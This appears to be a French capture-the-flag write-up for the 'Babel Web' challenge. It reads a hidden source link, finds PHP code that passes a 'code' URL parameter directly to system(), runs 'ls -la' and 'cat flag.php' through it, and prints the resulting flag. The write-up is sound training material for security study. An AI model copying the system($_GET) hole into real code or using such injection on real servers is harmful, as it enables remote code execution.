# Babel Web

<img src="https://media.discordapp.net/attachments/707246075441840169/707263469216333885/unknown.png?width=964&height=1073" width="500" height="600"><img>

Pour ce challenge qui est donc Babel Web on n'a pas vraiment d'indice dans l'énoncé pour savoir où commencer à fouiller, cependant on a deux hints donc un qui nous dit : "Essayez d'exécuter des commandes PHP pour extraire le flag.".
En arrivant sur la page d'accueil on observe un message de maintenance :

<img src ="https://media.discordapp.net/attachments/707246075441840169/707264817471160320/unknown.png?width=2184&height=1133"></img>

En voyant ça je décide donc d'afficher le code source de la page à l'aide d'un `curl -X GET` mais ça me renvoie directement une erreur `curl: (5) Could not resolve proxy: GET`, donc j'utilise une méthode "PUTS". J'envoie donc ma requê
te et j'obtiens ceci :

```html
<html>
	<head>
		<title>Bienvenue à Babel Web!</title>
	</head>	
	<body>
		<h1>Bienvenue à Babel Web!</h1>
		La page est en cours de développement, merci de revenir plus tard.
		<!-- <a href="?source=1">source</a> -->
	</body>
</html>
```
Suite au résultat obtenue j'ajoute donc à mon url `?source=1` afin d'afficher le code source côté serveur donc PHP.
```php
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
```
En observant le code PHP de la page on comprend très rapidement qu'il suffit de remplacer `?source=1` par `?code=` afin d'exécuter du code directement depuis la page web sur la machine. Je modifie donc le `?source=1` par `?code=ls -la` afin de vérifier mes propos et bingo !
```
total 16
dr-xr-xr-x 1 www-data www-data 4096 Apr 25 09:00 .
drwxr-xr-x 1 root     root     4096 Apr 25 09:00 ..
-r--r--r-- 1 root     root       89 Apr 25 08:59 flag.php
-r-xr-xr-x 1 root     root      439 Apr 25 08:59 index.php
```
Plus qu'à modifier `ls -la` par un : `cat flag.php` pour afficher le code de la page.
Voilà un premier challenge déjà de terminé car on obtient le flag qui est dans la variable `$flag` :
`$flag = "FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}";`
